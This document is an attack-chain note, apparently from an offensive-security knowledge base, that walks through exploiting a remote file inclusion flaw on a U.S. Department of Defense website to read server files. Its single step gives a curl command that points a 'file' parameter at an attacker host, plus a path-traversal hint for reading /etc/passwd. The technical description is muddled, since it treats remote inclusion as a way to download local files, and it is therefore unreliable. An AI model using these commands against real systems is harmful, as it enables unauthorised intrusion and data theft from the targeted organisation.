---
tags:
  - rfi
  - web-vuln
  - file-inclusion
  - dod
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-rfi-exploit]]'
platforms:
  - Web
complexity: low
procedures:
  - '[[procedures/Exploit-RFI-Via-Crafted-URL]]'
step_count: 1
techniques:
  - '[[Exploit Public-Facing Application]]'
description: >-
  Exploitation of an RFI vulnerability on a U.S. Department of Defense website
  via a crafted URL to unauthorizedly download local server files, potentially
  exposing sensitive information.
skill_level: beginner
impact_level: high
id: 77e8145d-6b21-47bd-b1c4-dacc3f0766e6
created_at: '2025-12-14T17:26:12.283Z'
updated_at: '2025-12-14T17:26:12.283Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Remote File Inclusion to Download Local Files on DoD Website

Multi-stage attack chain demonstrating a complete attack workflow.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 1 |
| Execution Time | ~1 minutes |
| Skill Level | Beginner |
| Complexity | Low |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access via RFI] --> B[File Download and Exfiltration]

    style A fill:#e74c3c
    style B fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (uses standard HTTP client like curl or browser)

### Target Environment

- Web application on a public-facing server
- Vulnerable endpoint accepting URL parameters for file inclusion
- No specific ports required beyond standard HTTP/HTTPS (80/443)

### Initial Access Requirements

- Public network access to the DoD website
- No credentials needed
- Knowledge of the vulnerable URL parameter

## Detailed Attack Procedures

### Step 1: Exploit RFI for File Download
procedure: [[procedures/Exploit-RFI-Via-Crafted-URL]]

**Objective**: Gain unauthorized access to local files on the server by exploiting the RFI vulnerability through a manipulated URL parameter, leading to download of sensitive files.

**Instructions**: Identify the vulnerable endpoint on the DoD website that processes a URL parameter for file inclusion (e.g., a parameter like 'file' or 'include'). Craft a URL that points to a remote resource but leverages the misconfiguration to include and download local files such as /etc/passwd or configuration files. Use [[commands/curl-rfi-exploit]] to send the request and capture the response:

```bash
curl "https://vulnerable.dod.gov/page.php?file=http://attacker.com/evil.txt" -o downloaded_file.txt
```

Adjust the URL parameter to target local files by exploiting the inclusion logic, such as using a path like '../../../../etc/passwd' if local file inclusion is also possible, but focus on remote inclusion to trigger the download.

**Expected Output**: The server responds with the contents of the included local file, which is saved to downloaded_file.txt, revealing system information like user accounts or configs.

**Success Indicators**:
- HTTP response contains sensitive file contents (e.g., usernames, paths)
- Downloaded file is not empty and includes server-specific data
- No error messages indicating blocked inclusion
